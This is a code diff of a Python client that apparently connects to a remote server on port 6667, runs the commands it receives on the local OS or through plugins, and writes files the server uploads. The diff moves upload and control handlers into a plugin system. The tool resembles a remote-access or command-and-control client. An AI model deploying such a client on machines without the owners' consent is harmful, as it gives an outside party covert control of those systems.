@@ -11,6 +11,9 @@ from time import sleep
 class LoopController(object):
     def __init__(self):
         self.should_break = False
+        self.should_return = False
+        self.should_continue = False
+        self.return_value = None
 
 
 class Client(object):
@@ -19,12 +22,10 @@ class Client(object):
     server commands to the OS, or to Client plugins.
     """
 
-    def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False):
+    def __init__(self, host='', port=6667, recv_size=1024, session_id=''):
         self.host = host
         self.port = port
         self.recv_size = recv_size
-        self.server_shutdown = server_shutdown
-        self.shutdown_kill = shutdown_kill
         self.session_id = session_id
         self.reconnect_to_session = True
         self.ip_address = '0.0.0.0'
@@ -206,7 +207,6 @@ class Client(object):
             'port={}'.format(self.port),
             'host={}'.format(self.host),
             'recv_size={}'.format(self.recv_size),
-            'server_shutdown={}'.format(self.server_shutdown),
             'session_id='.format(self.session_id)
         ]
         # execv(sys.executable, rc)
@@ -241,37 +241,6 @@ class Client(object):
         self._connect_to_server()
         return self
 
-    def write_file_data(self, upload_data, upload_filepath):
-        """
-        Write the upload_data to the upload_filename
-
-        :param upload_data:
-        :param upload_filepath:
-        :return:
-        """
-
-        with open(realpath(upload_filepath), 'wb') as f:
-            f.write(b64decode(upload_data))
-        print('<', upload_filepath, 'written...', '>')
-        return
-
-    def handle_file_upload(self, upload_data, upload_filename):
-        """
-        Handle the file upload.
-
-        :param upload_data:
-        :param upload_filename:
-        :return:
-        """
-
-        try:
-            self.write_file_data(upload_data, upload_filename)
-            self.send_data('Got file.')
-        except FileNotFoundError as err_msg:
-            self.send_data('Could not fine the directory to write to: {}'.format(err_msg))
-
-        return self
-
     def main(self):
         """
         Start receiving commands.
@@ -284,62 +253,26 @@ class Client(object):
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
-            upload_filepath = False
+            # upload_filepath = False
             while True:
                 data = self.receive_data()
 
-                if len(data) < 500:
-                    # Send ip back to server.
-                    if data[:6] == 'get ip':
-                        self.send_data(self.ip_address)
-                        continue
+                if not data:
+                    self.send_data('')
+                    continue
 
-                    # Disconnect from the server.
-                    if data == 'disconnect':
-                        self.handle_disconnect()
-                        continue
-
-                    # Break the loop.
-                    if data == 'break':
-                        self.send_data(' ')
-                        break
-
-                    # Reboot self.
-                    if data == 'shell reboot':
-                        self.send_data('confirmed')
-                        self.sock.close()
-                        break
-
-                    # # # # # # # PROCESS PLUGINS # # # # # # #
+                # # # # # # # PROCESS PLUGINS # # # # # # #
+                if not data[0] == '\\':
                     plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
                     if plugin_ran:
                         if isinstance(loop_controller, LoopController):
                             if loop_controller.should_break:
                                 break
+                            if loop_controller.should_return:
+                                return loop_controller.return_value
+                            if loop_controller.should_continue:
+                                continue
                         continue
-
-                    # Handle setting the file upload name.
-                    if data[:16] == 'upload_filepath ':
-                        upload_filepath = data[16:]
-                        self.send_data('Got filepath.')
-                        continue
-
-                # # # # # # # PROCESS PLUGINS # # # # # # #
-                plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
-                if plugin_ran:
-                    if isinstance(loop_controller, LoopController):
-                        if loop_controller.should_break:
-                            break
-                    continue
-
-                if data[:11] == 'upload_data':
-                    if not upload_filepath:
-                        self.send_data('Requires an upload filename.  Send with `upload_filename {filename}`.')
-                        continue
-                    self.send_data('Send Data')
-                    upload_data = self.receive_data()
-                    self.handle_file_upload(upload_data, upload_filepath)
-                    continue
 
                 # Process the command.
                 try:
@@ -428,14 +361,12 @@ if __name__ == '__main__':
     the_host = ''
     the_port = 6667
     the_recv_size = 1024
-    the_server_shutdown = False
     the_session_id = ''
 
     def check_cli_arg(arg):
         global the_host
         global the_port
         global the_recv_size
-        global the_server_shutdown
         global the_session_id
 
         if 'host=' in arg:
@@ -444,8 +375,6 @@ if __name__ == '__main__':
             the_port = int(arg.split('=')[1])
         elif 'recv_size=' in arg:
             the_recv_size = int(arg.split('=')[1])
-        elif 'server_shutdown=' in arg:
-            the_server_shutdown = True if arg.split('=')[1].upper() == 'Y' else False
         elif 'session_id=' in arg:
             the_session_id = arg.split('=')[1].strip()
 
@@ -457,7 +386,6 @@ if __name__ == '__main__':
         host=the_host,
         port=the_port,
         recv_size=the_recv_size,
-        server_shutdown=the_server_shutdown,
         session_id=the_session_id
     )
 
